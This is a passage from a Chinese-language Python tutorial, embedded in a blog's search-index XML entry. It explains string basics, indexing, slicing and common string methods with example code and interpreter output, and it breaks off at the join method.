    <entry>
      <title>3. 序列类型</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/3.%20%E5%BA%8F%E5%88%97%E7%B1%BB%E5%9E%8B.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/3.%20%E5%BA%8F%E5%88%97%E7%B1%BB%E5%9E%8B.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>序列类型：字符串、列表、元组、字典、集合</p><h1 id="字符串介绍"><a href="#字符串介绍" class="headerlink" title="字符串介绍"></a>字符串介绍</h1><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>如下定义的变量a，存储的是数字类型的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">100</span></span><br></pre></td></tr></table></figure><p>如下定义的变量b，存储的是字符串类型的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quot;www.tulingxueyuan.com&quot;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">b = <span class="string">&#x27;www.tulingxueyuan.com&#x27;</span></span><br></pre></td></tr></table></figure><p>小总结：</p><ul><li>双引号或者单引号中的数据，就是字符串</li></ul><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意</strong>：</h4><p><strong><u>字符串和元组一样的不可变类型~~~~！！！！很重要，一定要注意这一点！！</u></strong></p><p>后面的一些操作比如说upper()，这些函数都不会改变源字符串：这些函数返回的是一个内存中的新字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串不可变类型</span></span><br><span class="line"><span class="comment"># 字符串字母全部变大写和变小写 lower,upper</span></span><br><span class="line">name = <span class="string">&#x27;dahai&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(name))</span><br><span class="line"><span class="comment"># # 新值</span></span><br><span class="line">name=name.upper()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(name))</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">dahai</span><br><span class="line">2482830425456</span><br><span class="line">DAHAI</span><br><span class="line">2482830469168</span><br></pre></td></tr></table></figure><h4 id="多行字符串（换行）"><a href="#多行字符串（换行）" class="headerlink" title="多行字符串（换行）"></a>多行字符串（换行）</h4><blockquote><p>python中的代码换行</p></blockquote><blockquote><p><a href="https://blog.csdn.net/GreenHandCGL/article/details/79703863">Python中的三引号的用法</a></p></blockquote><ol><li>利用<code>\</code>续行符连接</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&#x27;第一行\n&#x27;</span>\</span><br><span class="line">      <span class="string">&#x27;第二行&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br></pre></td></tr></table></figure><ol start="2"><li>利用三引号<code>&#39;&#39;&#39;</code>的方式连接多行字符串，就跟注释一样</li><li>加上括号，<code>() &#123;&#125; []</code>中不需要特别加换行符</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091213265.png" alt="image-20221009121307766" style="zoom:50%;" /><h4 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h4><p>下标：就是标记空间的一个数字</p><p>有些文档叫法为“索引”，个人觉得其实下标更好的体现它的特点。</p><p>如果有字符串：name &#x3D; ‘abcdef’，在内存中的实际存储如下：</p><blockquote><p>下标为正数</p></blockquote><table><thead><tr><th align="center">第0个空间</th><th align="center">第1个空间</th><th align="center">第2个空间</th><th align="center">第3个空间</th><th align="center">第4个空间</th><th align="center">第5个空间</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">b</td><td align="center">c</td><td align="center">d</td><td align="center">e</td><td align="center">f</td></tr></tbody></table><blockquote><p>下标为负数</p></blockquote><table><thead><tr><th align="center">第 -6 个空间</th><th align="center">第 -5 个空间</th><th align="center">第 -4 个空间</th><th align="center">第 -3 个空间</th><th align="center">第 -2 个空间</th><th align="center">第 -1 个空间</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">b</td><td align="center">c</td><td align="center">d</td><td align="center">e</td><td align="center">f</td></tr></tbody></table><p>特点：</p><ul><li>每个字符单独存储，各占一个存储空间</li><li>为了方便标记处哪个空间存放的是哪个字符，Python使用了”下标”</li><li>如果从左侧开始编号，那么下标从 <code>0</code> 开始</li><li>如果从右侧开始编号，那么下标从<code>-1</code>开始</li><li>如果字符串只有3个字符例如”abc”，那么能用的下标为0、1、2不能使用超过2以上的，这种情况就是”越界”很危险会导致程序崩溃</li></ul><h4 id="下标的使用"><a href="#下标的使用" class="headerlink" title="下标的使用"></a>下标的使用</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure><h1 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h1><h4 id="什么是切片"><a href="#什么是切片" class="headerlink" title="什么是切片"></a>什么是切片</h4><p>较为官方的说法：切片是指对操作的对象截取其中一部分的操作</p><p>通俗来说：一种能够从数据中取到一部分数据的方式</p><p>例如：</p><p>有一个字符串<code>&quot;abcdef&quot;</code>，我们可以通过切片取到<code>&quot;cde&quot;</code></p><p>切片不仅可以在字符串中应用，还可以对列表、元组等进行操作，简言之“切片”功能很重要。</p><p>本节课我们以字符串为例讲解“切片”</p><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><blockquote><p>语法</p></blockquote><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[起始:结束:步长]</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>选取的区间从”起始”位开始，到”结束”位的前一位结束（不包含结束位本身)，步长表示选取间隔</li><li>默认“步长”为1，即取完一个下标的数据之后，第二个下标的是在刚刚下标基础上+1</li><li>步长为正数，表示从左向右取数据</li><li>步长为负数，表示从右向左取数据</li></ul><blockquote><p>示例代码</p></blockquote><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">3</span>])  <span class="comment"># 取下标为0、1、2的字符，注意取不到下标为3的空间</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[:<span class="number">3</span>])  <span class="comment"># 取下标为0、1、2的字符，注意取不到下标为3的空间</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果第一个参数没写则默认为0开始</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">abc</span><br></pre></td></tr></table></figure><p>示例三：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">3</span>:<span class="number">5</span>])  <span class="comment"># 取下标为3、4 的字符</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">de</span><br></pre></td></tr></table></figure><p>示例四：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>:])  <span class="comment"># 取下标为2开始到最后的字符</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">cdef</span><br></pre></td></tr></table></figure><p>示例五：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>:-<span class="number">1</span>])  <span class="comment"># 取 下标为1开始到右侧第2个字符之间的所有字符</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">bcde</span><br></pre></td></tr></table></figure><p>示例六：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">步长为2表示间隔1个值取一次</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">bd</span><br></pre></td></tr></table></figure><p>示例七：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">5</span>:<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5: 起始位置</span></span><br><span class="line"><span class="string">1: 结束位置 （不包含）</span></span><br><span class="line"><span class="string">-1: 步长，表示从右往左取值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fedc</span><br></pre></td></tr></table></figure><p>示例八：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">5</span>:<span class="number">1</span>:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5: 起始位置</span></span><br><span class="line"><span class="string">1: 结束位置 （不包含）</span></span><br><span class="line"><span class="string">-2: 步长，表示从右往左取值并间隔一个值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fd</span><br></pre></td></tr></table></figure><p>示例九：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[::<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">起始位置: 未设置</span></span><br><span class="line"><span class="string">结束位置:未设置</span></span><br><span class="line"><span class="string">1: 步长</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">表示从最左边取值到最右边(包含最右边)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">abcdef</span><br></pre></td></tr></table></figure><p>示例十：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[::])</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">abcdef</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>开始位置、结束位置都未指定，且步长也未指定那么步长用默认的1，则此时从最左取到最右</li></ul><p>示例十一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fedcba</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>开始位置、结束位置都未指定，步长为<code>-1</code>，此时从最右取到最左</li></ul><p>示例十二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(name[::-<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fdb</span><br></pre></td></tr></table></figure><p>说明</p><ul><li>开始、结束位置都未指定，且步长是<code>-2</code>，那么就意味着从右侧往左取数据，且步长为2（即隔一个取一个）</li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>给定一个字符串变量<code>s</code>，请反转字符串：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(s[:]) <span class="comment"># 取出所有元素（没有起始位和结束位之分），默认步长为1</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:]) <span class="comment"># 从下标为1开始，取出 后面所有的元素（没有结束位）</span></span><br><span class="line"><span class="built_in">print</span>(s[:<span class="number">5</span>])  <span class="comment"># 从起始位置开始，取到 下标为5的前一个元素（不包括结束位本身）</span></span><br><span class="line"><span class="built_in">print</span>(s[:-<span class="number">1</span>]) <span class="comment"># 从起始位置开始，取到 倒数第一个元素（不包括结束位本身）</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">4</span>:-<span class="number">1</span>]) <span class="comment"># 从倒数第4个元素开始，取到 倒数第1个元素（不包括结束位本身）</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>]) <span class="comment"># 从下标为1开始，取到下标为5的前一个元素，步长为2（不包括结束位本身）</span></span><br><span class="line"><span class="comment"># python 字符串快速逆序</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])  <span class="comment"># 从后向前，按步长为1进行取值</span></span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><p>切片使用规则中，要么一个冒号<code>[开始位置:结束位置]</code>，要么两个冒号<code>[开始位置:结束位置:步长]</code></p></li><li><p>不写步长时，默认为1</p></li><li><p>步长为正数，表示从左向右取数据</p></li><li><p>步长为负数，表示从右向左取数据</p></li><li><p>当开始位置、结束位置都没有设定时，要看步长，如果步长为正数此时开始位置理解为最左 结束位置为最右，如果步长为负数此时开始位置理解为最右 结束位置为最左</p></li></ul><h1 id="字符串常见操作"><a href="#字符串常见操作" class="headerlink" title="字符串常见操作"></a>字符串常见操作</h1><h4 id="find-方法"><a href="#find-方法" class="headerlink" title="find 方法"></a><strong>find 方法</strong></h4><p>检测<code>str</code>是否包含在 <code>my_str</code>中，如果是返回开始的索引值，否则返回<code>-1</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.find(<span class="built_in">str</span>, start=<span class="number">0</span>, end=<span class="built_in">len</span>(mystr))</span><br><span class="line"><span class="comment">#后面两个参数不是必须的</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.find(<span class="string">&quot;to&quot;</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="number">8</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>上述运行中数值<code>8</code>表示<code>&quot;to&quot;</code>这个字符串在原字符串的开始下标值是<code>8</code></li></ul><h4 id="rfind-方法"><a href="#rfind-方法" class="headerlink" title="rfind 方法"></a>rfind 方法</h4><p>类似于<code> find()</code>函数，不过是从右边开始查找，返回的索引是从左边开始</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.rfind(<span class="built_in">str</span>, start=<span class="number">0</span>, end=<span class="built_in">len</span>(my_str) )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.rfind(<span class="string">&quot;to&quot;</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="count-方法"><a href="#count-方法" class="headerlink" title="count 方法"></a><strong>count 方法</strong></h4><p>返回<code> str</code>在<code>start</code>和<code>end</code>之间在 <code>my_str</code>里面出现的次数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.count(<span class="built_in">str</span>, start=<span class="number">0</span>, end=<span class="built_in">len</span>(mystr))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.count(<span class="string">&quot;w&quot;</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure><h4 id="replace-方法"><a href="#replace-方法" class="headerlink" title="replace 方法"></a><strong>replace 方法</strong></h4><p>把 <code>my_str</code> 中的 <code>str1</code> 替换成 <code>str2</code>,如果 <code>count</code> 指定，则替换不超过 <code>count</code> 次</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.replace(str1, str2,  mystr.count(str1))</span><br><span class="line"><span class="comment">#第三个参数可以不指定</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.replace(<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">&#x27;Welcome to www.tulingxueyuan.com&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="split-方法"><a href="#split-方法" class="headerlink" title="split 方法"></a><strong>split 方法</strong></h4><p>以 str 为分隔符切片 <code>my_str</code>，如果 <code>maxsplit</code>有指定值，则仅分隔 <code>maxsplit</code> 个子字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.split(<span class="built_in">str</span>=<span class="string">&quot; &quot;</span>, maxsplit)    </span><br><span class="line"><span class="comment">#默认以空格切割</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: my_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">Out[<span class="number">2</span>]: [<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;www.tulingxueyuan.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.split(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)</span><br><span class="line">Out[<span class="number">3</span>]: [<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;to www.tulingxueyuan.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: </span><br></pre></td></tr></table></figure><h4 id="startswith-方法"><a href="#startswith-方法" class="headerlink" title="startswith 方法"></a>startswith 方法</h4><p>检查字符串是否是以 <code>指定的字符串</code> 开头, 是则返回 <code>True</code>，否则返回 <code>False</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.startswith(<span class="string">&#x27;这里写入你指定的字符串&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line">...</span><br><span class="line">In [<span class="number">4</span>]: my_str.startswith(<span class="string">&#x27;welcome&#x27;</span>)</span><br><span class="line">Out[<span class="number">4</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: my_str.startswith(<span class="string">&#x27;Welcome&#x27;</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="endswith-方法"><a href="#endswith-方法" class="headerlink" title="endswith 方法"></a>endswith 方法</h4><p>检查字符串是否以<code>指定字符串</code>结束，如果是返回<code>True</code>,否则返回 <code>False</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.endswith(<span class="string">&#x27;这里写入你指定的字符串&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line">...</span><br><span class="line">In [<span class="number">6</span>]: my_str.endswith(<span class="string">&#x27;com&#x27;</span>)</span><br><span class="line">Out[<span class="number">6</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="lower-方法"><a href="#lower-方法" class="headerlink" title="lower 方法"></a><strong>lower 方法</strong></h4><blockquote><p>常用于数据库、网站开发</p></blockquote><p>转换 <code>my_str</code> 中所有大写字符为小写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.lower()        </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">8</span>]: my_str = <span class="string">&quot;WELCOME to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: my_str.lower()</span><br><span class="line">Out[<span class="number">9</span>]: <span class="string">&#x27;welcome to www.tulingxueyuan.com&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="upper-方法"><a href="#upper-方法" class="headerlink" title="upper 方法"></a><strong>upper 方法</strong></h4><p>转换 <code>my_str</code> 中所有小写字母为大写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.upper()    </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">10</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: my_str.upper()</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">&#x27;WELCOME TO WWW.TULINGXUEYUAN.COM&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="strip-方法"><a href="#strip-方法" class="headerlink" title="strip 方法"></a><strong>strip 方法</strong></h4><p>删除字符串两端的空白字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">12</span>]: my_str = <span class="string">&quot;   welcome to www.tulingxueyuan.com   &quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: my_str.strip()</span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">&#x27;welcome to www.tulingxueyuan.com&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="partition-方法"><a href="#partition-方法" class="headerlink" title="partition 方法"></a>partition 方法</h4><blockquote><p>基本上用不到</p></blockquote><p>把<code>my_str</code>以<code>str</code>分割成三部分,<code>str</code>前，<code>str</code>和<code>str</code>后，分隔开的各个部分也会保留空格</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.partition(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">14</span>]: my_str = <span class="string">&quot;welcome to www.tulingxueyuan.com&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: my_str.partition(<span class="string">&#x27;to&#x27;</span>)</span><br><span class="line">Out[<span class="number">15</span>]: (<span class="string">&#x27;welcome &#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27; www.tulingxueyuan.com&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="splitlines-方法"><a href="#splitlines-方法" class="headerlink" title="splitlines 方法"></a>splitlines 方法</h4><p>按照行分隔，返回一个包含各行作为元素的列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.splitlines()  </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">16</span>]: my_str = <span class="string">&quot;&quot;&quot;welcome to www.tulingxueyuan.com</span></span><br><span class="line"><span class="string">    ...: thank you</span></span><br><span class="line"><span class="string">    ...: good good study day day up</span></span><br><span class="line"><span class="string">    ...: &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: my_str.splitlines()</span><br><span class="line">Out[<span class="number">17</span>]: [<span class="string">&#x27;welcome to www.tulingxueyuan.com&#x27;</span>, <span class="string">&#x27;thank you&#x27;</span>, <span class="string">&#x27;good good study day day up&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="isalpha-方法"><a href="#isalpha-方法" class="headerlink" title="isalpha 方法"></a>isalpha 方法</h4><p>如果 <code>my_str</code> 所有字符都是字母 则返回 <code>True</code>,否则返回 <code>False</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.isalpha()  </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">18</span>]: my_str = <span class="string">&quot;abc123&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: my_str.isalpha()</span><br><span class="line">Out[<span class="number">19</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: my_str = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: my_str.isalpha()</span><br><span class="line">Out[<span class="number">21</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="isdigit-方法"><a href="#isdigit-方法" class="headerlink" title="isdigit 方法"></a>isdigit 方法</h4><p>如果 <code>my_str</code> 只包含数字则返回 <code>True</code> 否则返回 <code>False</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.isdigit() </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">60</span>]: my_str = <span class="string">&quot;abc123&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">61</span>]: my_str.isdigit()</span><br><span class="line">Out[<span class="number">61</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">62</span>]: my_str = <span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">63</span>]: my_str.isdigit()</span><br><span class="line">Out[<span class="number">63</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="isalnum-方法"><a href="#isalnum-方法" class="headerlink" title="isalnum 方法"></a>isalnum 方法</h4><p>如果 <code>my_str</code> 所有字符都是字母或数字则返回 <code>True</code>,否则返回 <code>False</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.isalnum()  </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: my_str = <span class="string">&#x27;abc123&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: my_str.isalnum()</span><br><span class="line">Out[<span class="number">3</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: my_str = <span class="string">&#x27;abc123_&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: my_str.isalnum()</span><br><span class="line">Out[<span class="number">5</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="join-方法"><a href="#join-方法" class="headerlink" title="join 方法"></a><strong>join 方法</strong></h4><p>返回一个由 <em>序列类型</em> 中的字符串拼接而成的字符串。 如果 <em>序列类型</em> 中存在任何非字符串值包括 <a href="#bytes"><code>bytes</code></a> 对象则会引发 <a href="exceptions.html#TypeError"><code>TypeError</code></a>。 调用该方法的字符串将作为元素之间的分隔。</p><p>注意其特殊的用法，是字符串的函数，其join的如果是序列类型，则实际上就相当于在序列类型的中间插入字符串~~</p><p><code>my_str</code> 中每个元素后面插入<code>str</code>,构造出一个新的字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str.join(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">6</span>]: my_str = <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: str_list = [<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;changsha&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: 